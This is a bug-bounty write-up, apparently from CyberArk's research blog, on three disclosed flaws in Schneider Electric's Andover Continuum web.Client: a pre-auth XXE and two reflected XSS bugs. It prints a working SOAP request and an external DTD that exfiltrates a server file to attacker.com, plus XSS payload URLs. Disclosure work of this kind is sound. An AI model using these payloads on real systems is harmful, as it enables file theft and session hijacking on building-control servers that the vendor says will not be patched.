---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-27_bug-hunting-stories-schneider-electric-the-andover-continuum-webclient.md
original_filename: 2020-05-27_bug-hunting-stories-schneider-electric-the-andover-continuum-webclient.md
title: 'Bug Hunting Stories: Schneider Electric & The Andover Continuum Web.Client'
category: documents
detected_topics:
- xss
- access-control
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- access-control
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: b75c78c820f839b3c008dd16a18231a6d7a2c262f78a953de9807cca7e4a3ea2
text_sha256: ef5988a23dc870e562d14d7402122a298676c0612e679f0d8f9909aa991e5445
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Bug Hunting Stories: Schneider Electric & The Andover Continuum Web.Client

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-27_bug-hunting-stories-schneider-electric-the-andover-continuum-webclient.md
- Source Type: markdown
- Detected Topics: xss, access-control, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `b75c78c820f839b3c008dd16a18231a6d7a2c262f78a953de9807cca7e4a3ea2`
- Text SHA256: `ef5988a23dc870e562d14d7402122a298676c0612e679f0d8f9909aa991e5445`


## Content

---
title: "Bug Hunting Stories: Schneider Electric & The Andover Continuum Web.Client"
url: "https://www.cyberark.com/resources/threat-research-blog/bug-hunting-stories-schneider-electric-the-andover-continuum-web-client"
final_url: "https://www.cyberark.com/resources/threat-research-blog/bug-hunting-stories-schneider-electric-the-andover-continuum-web-client"
authors: ["Niv Levy (@restr1ct3d)"]
programs: ["Uber"]
bugs: ["XXE", "Reflected XSS"]
publication_date: "2020-05-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4561
---

# Bug Hunting Stories: Schneider Electric & The Andover Continuum Web.Client

May 27, 2020 Niv Levy

  * Share this Article
  * [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fbug-hunting-stories-schneider-electric-the-andover-continuum-web-client)
  * [Twitter](https://twitter.com/share?text=Bug%20Hunting%20Stories%3A%20Schneider%20Electric%20%26%20The%20Andover%20Continuum%20Web.Client&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fbug-hunting-stories-schneider-electric-the-andover-continuum-web-client&via=CyberArk)
  * [Email](/cdn-cgi/l/email-protection#19266a6c7b737c7a6d245a76776d7c776d3c2b297f6b76743c2b2974603c2b29516c7b3c2b283f787469227b767d60245a717c7a723c2b29766c6d3c2b296e71786d3c2b2e6a3c2b29717869697c7770777e3c2b29786d3c2b295a607b7c6b586b723c2b283c29583c29585b6c7e3c2b29516c776d70777e3c2b294a6d766b707c6a3c2a583c2b294a7a71777c707d7c6b3c2b295c757c7a6d6b707a3c2b293c2b2f3c2b294d717c3c2b2958777d766f7c6b3c2b295a76776d70776c6c743c2b294e7c7b375a75707c776d3c2958586a3c2b29783c2b29697c777c6d6b786d7076773c2b296d7c6a6d7c6b3c2b5a3c2b2974603c2b2974706a6a7076773c2b29706a3c2b296d763c2b297f70777d3c2b296f6c75777c6b787b7075706d707c6a373c2b294d763c2b296a71786b697c773c2b2974603c2b296a727075756a3c2b2978777d3c2b296d763c2b296a6d78603c2b296c69346d76347d786d7c3c2b296e706d713c2b29777c6e3c2b296d7c7a71777675767e707c6a3c2b5a3c2b29503c2b296a697c777d3c2b2974603c2b297f6b7c7c3c2b296d70747c3c2b2971787a7270777e3c2b2976773c2b29776c747c6b766c6a3c2b297b6c7e3c2b297b766c776d603c2b29696b767e6b78746a3c2b2976773737373c29583c2958716d6d696a3c2a583c2b5f3c2b5f6e6e6e377a607b7c6b786b72377a76743c2b5f6b7c6a766c6b7a7c6a3c2b5f6d716b7c786d346b7c6a7c786b7a71347b75767e3c2b5f7b6c7e34716c776d70777e346a6d766b707c6a346a7a71777c707d7c6b347c757c7a6d6b707a346d717c3478777d766f7c6b347a76776d70776c6c74346e7c7b347a75707c776d)
  * [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fbug-hunting-stories-schneider-electric-the-andover-continuum-web-client&title=Bug%20Hunting%20Stories%3A%20Schneider%20Electric%20%26%20The%20Andover%20Continuum%20Web.Client&summary=As%20a%20penetration%20tester%2C%20my%20mission%20is%20to%20find%20vulnerabilities.%20To%20sharpen%20my%20skills%20and%20to%20stay%20up-to-date%20with%20new%20technologies%2C%20I%20spend%20my%20free%20time%20hacking%20on%20numerous%20bug%20bounty%20programs%20on...)

![](https://www.cyberark.com/wp-content/uploads/2020/05/Boxelder-Bug-scaled.jpg)

As a penetration tester, my mission is to find vulnerabilities. To sharpen my skills and to stay up-to-date with new technologies, I spend my free time hacking on numerous bug bounty programs on the [Bugcrowd platform](https://bugcrowd.com/).

A few months back, I was invited by the Bugcrowd platform to participate in a private bug bounty program where I discovered three unknown vulnerabilities in the Schneider Electric Andover Continuum product line.

Malicious actors could exploit the three vulnerabilities without being authenticated by the application.

**The Andover Continuum Product**

First and foremost, let’s give some background on the Schneider Electric product in question. The Andover Continuum is a mixture of hardware and software designed to monitor and control the various functions of a building – including areas like security, access control, lighting, heating, ventilation and cooling. The hardware consists of equipment controllers, network communication controllers and input and output interfaces.

The web.Client gives the operator the freedom to access the Andover Continuum system from anywhere on the network or over the internet.

During the responsible disclosure process, the Schneider Electric team confirmed each of the reported vulnerabilities. They did note that the version used by the private program is several years old. However, the vulnerabilities still exist in the latest version, which is 2.03.

[![](https://www.cyberark.com/wp-content/uploads/2020/05/1.png)](https://www.cyberark.com/wp-content/uploads/2020/05/1.png) Figure 1: Software support policy for the Andover Continuum product line and the web.Client web interface.

![](https://www.cyberark.com/wp-content/uploads/2020/05/2.png)

**Vulnerabilities Exposed**

While navigating through the in-scope assets defined by the program, I found multiple web servers that exposed a login page related to the Schneider Electric Andover Continuum web.Client on version 1.94(SP1). And this is the crux of each of the vulnerabilities below. Let’s dive in.

[![](https://www.cyberark.com/wp-content/uploads/2020/05/3.png)](https://www.cyberark.com/wp-content/uploads/2020/05/3.png) Figure 2: The Andover Continuum web.Client web interface that was exposed.

**1\. Pre-Auth XML External Entity Injection (CVE-2020-7480)**

My research first found that the Andover Continuum web.Client web interface is vulnerable to a pre-auth [XML External Entity Injection vulnerability](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_\(XXE\).html).

The vulnerability allows an unauthenticated attacker to view files on the application server filesystem and interact with any backend or external systems that the application itself can access.

On the reconnaissance phase, I found that the Andover Continuum web.Client web interface discloses a Web Service with a method named Pr ocessRequest that can be invoked without authentication.

The Web Service was accessible by navigating to the following URL:

https://vulnerable.com/webclient/AcDev.asmx

[![](https://www.cyberark.com/wp-content/uploads/2020/05/4.png)](https://www.cyberark.com/wp-content/uploads/2020/05/4.png) Figure 3: The web service that disclosed a method that could be invoked without authentication.

In my case, the XXE vulnerability was “blind,” which means that you do not get the output of the vulnerability in direct response to the vulnerable request. To exploit this vulnerability, I have used an out-of-band (OOB) technique, which provides an attacker with an alternative way to confirm and exploit a vulnerability.

Out-of-band techniques often require a vulnerable entity to generate an outbound TCP/UDP/ICMP request, which will then allow an attacker to exfiltrate data. Moreover, the success of an OOB attack is based on the egress firewall rules, i.e. which outbound request is permitted from the vulnerable system and the perimeter firewall.

The following POST request presents how an unauthenticated attacker could exploit the XML External Entity Injection vulnerability. The xmlIn child element gets XML data from the user and then the XML data is passed to the SOAP framework.
  
  
  POST /webclient/AcDev.asmx HTTP/1.1 Connection: close
  
  Upgrade-Insecure-Requests: 1
  
  DNT: 1
  
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
  
  Sec-Fetch-User: ?1 Accept:
  
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/a png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  
  Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate
  
  Referer: https://vulnerable.com/webclient/AcDev.asmx Accept-Encoding: gzip, deflate
  
  Accept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7 SOAPAction: http://andovercontrols.com/pyramid/acdevservices/ProcessRequest Content-Type: text/xml;charset=UTF-8
  
  Host: vulnerable.com Content-Length: 473
  
   
  
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:acd="http://andovercontrols.com/pyramid/acdevservices/">
  
  <soapenv:Header/>
  
  <soapenv:Body>
  
  <acd:ProcessRequest>
  
  <acd:xmlIn>&lt;!DOCTYPE r [
  
  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
  
  %dtd;
  
  %param1;]&gt; &lt;r&gt;&amp;exfil;&lt;/r&gt;</acd:xmlIn>
  
  </acd:ProcessRequest>
  
  </soapenv:Body>
  
  </soapenv:Envelope>
  
  

The following is an example of how an attacker could leverage parameter entities to steal sensitive data using an out-of-band (OOB) technique. The content of the external DTD file evil.dtd that hosted on the attacker’s server is below:
  
  
  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?file=%file;'>">

The attack is conducted as follows:

  1. The XML parser makes a GET request to the attacker’s DTD file, which is hosted on the attacker’s server, i.e. [http://attacker.com/evil.dtd.](http://attacker.com/evil.dtd)
  2. The XML parser processes the %file parameter entity, which loads the file c:/windows/win.ini.
  3. After the XML parser processes the attacker’s DTD file, the %param1 parameter entity creates a general entity called &exfil, which contains a URL. This URL includes the file’s contents.
  4. Finally, after the URL is constructed, the XML parser processes the &exfil entity, which makes a request to the attacker’s server.
  5. The attacker can log the request on their end and reconstruct the file from the log entry.

[![](https://www.cyberark.com/wp-content/uploads/2020/05/5-1.png)](https://www.cyberark.com/wp-content/uploads/2020/05/5-1.png) Figure 4: XML External Entity Injection explained (The image was taken from https://portswigger.net/web-security/xxe)

**2\. Pre-Auth Reflected Cross-Site Scripting (CVE-2020-7481, CVE-2020-7482)**

**** The Andover Continuum web.Client web interface is also vulnerable to pre-auth [Reflected Cross-Site Scripting vulnerability](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_\(XSS\)). The vulnerability is due to insufficient validation of user-supplied input by the web-based management interface of the affected device.

On the reconnaissance phase, I found that the Andover Continuum web.Client web interface serves two webpages for unauthenticated users:
  
  
  /AccCommon/ping.aspx
  
  /AccCommon/ReportEditor.aspx

If the victim (an authenticated user) visits a malformed URL, then the attacker’s script executes in the victim’s browser in the context of that victim’s session with the application. At that point, the script can carry out any action – and retrieve any data – to which the user has access.

The following GET requests present the vulnerable parameters on each webpage that served for unauthenticated users:

https://vulnerable.com/AccCommon/ping.aspx?User=1&WebClientName=2&vd=3'; alert(document.domain)//

https://vulnerable.com/AccCommon/ReportEditor.aspx?cmd=view&ext=true&idH i=0&idLo=0&VD=</style><svg/onload=alert(document.domain)>&Protocol=1

[![](https://www.cyberark.com/wp-content/uploads/2020/05/6-1.png)](https://www.cyberark.com/wp-content/uploads/2020/05/6-1.png) Figure 5: Cross-Site Scripting explained (The image was taken from https://portswigger.net/web-security/cross-site-scripting).

In recent years, SCADA technology has passed through a transformation, from isolated and proprietary systems into open architectures, thus significantly increasing outside attacks.

Organizations are struggling to keep SCADA environments up-to-date. It’s a challenge due to the complexity of the process in which SCADA systems are incorporated and because the systems often need to be operable at any given moment. Furthermore, patches need to be tested before they can be applied to the production environment, which can take days or even weeks during which a system is vulnerable.

The lack of modern mitigations and the proliferation of insecure coding practices make SCADA a juicy target for both researchers and attackers.

As a result of this research, Schneider Electric issued 3 CVE identifiers for these vulnerabilities:

CVE-2020-7480 - Base Score 8.8 | High |

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H CVE-2020-7481 - Base Score 6.1 | Medium |

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N CVE-2020-7482 - Base Score 6.1 | Medium | 

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

According to their security notification, “Given the clear path to [EcoStruxure Building Operation ](https://www.se.com/ww/en/product-range/62111-ecostruxure%E2%84%A2-building-operation)and available alternatives to these specific issues, no software fix will be provided for these issues.”

In other words, exposing the Andover Continuum web.Client web interface to the internet would put the product in jeopardy.

To reduce the risk until modernization of EcoStruxure Building, Schneider Electric is strongly recommending that customers use the methods below:

  * Locate control and safety system networks and remote devices behind firewalls and isolate them from the business network.
  * Install physical controls so no unauthorized personnel can access your industrial control and safety systems, components, peripheral equipment and networks.
  * Place all controllers in locked cabinets and never leave them in the “Program” mode.
  * Never connect programming software to any network other than the network for the devices that it is intended for.
  * Scan all methods of mobile data exchange with the isolated network such as CDs, USB drives, etc. before use in the terminals or any node connected to these networks.
  * Never allow laptops that have connected to any other network besides the intended network to connect to the safety or control networks without proper sanitation.
  * Minimize network exposure for all control system devices and systems and ensure that they are not accessible from the internet.
  * When remote access is required, use secure methods such as Virtual Private Networks (VPNs). Recognize that VPNs may have vulnerabilities and should be updated to the most current version available. Also, understand that VPNs are only as secure as the connected devices.

The security team at Schneider Electric was wonderful to work with. They were extremely responsive and truly appreciated the findings of this research.

**Disclosure Timeline**

  * 11 Jan 2020: The XML External Entity Injection vulnerability reported to the Schneider Electric security team.
  * 12 Jan 2020: The Schneider Electric security team confirmed receiving the XML External Entity Injection report.
  * 13 Jan 2020: The 1st XSS vulnerability reported to the Schneider Electric security team.
  * 14 Jan 2020: The Schneider Electric security team confirmed receiving the 1st XSS report.
  * 15 Jan 2020: The 2nd XSS vulnerability reported to the Schneider Electric security team.
  * 17 Jan 2020: The Schneider Electric security team confirmed receiving the 2nd XSS report.
  * 10 Mar 2020: The Schneider Electric security team released a security notification for the Andover continuum line of controllers and issued three CVE identifiers – CVE-2020-7480, CVE-2020-7481, and CVE-2020-7482.

**References**

Security Notification – Andover Continuum Line of Controllers

<https://www.se.com/ww/en/download/document/SEVD-2020-070-04/>

Portswigger’s Web Security Academy – XXE injection

<https://portswigger.net/web-security/xxe>

Portswigger’s Web Security Academy – Cross-site scripting <https://portswigger.net/web-security/cross-site-scripting> Out of Band Exploitation (OOB) CheatSheet

<https://www.notsosecure.com/oob-exploitation-cheatsheet/>
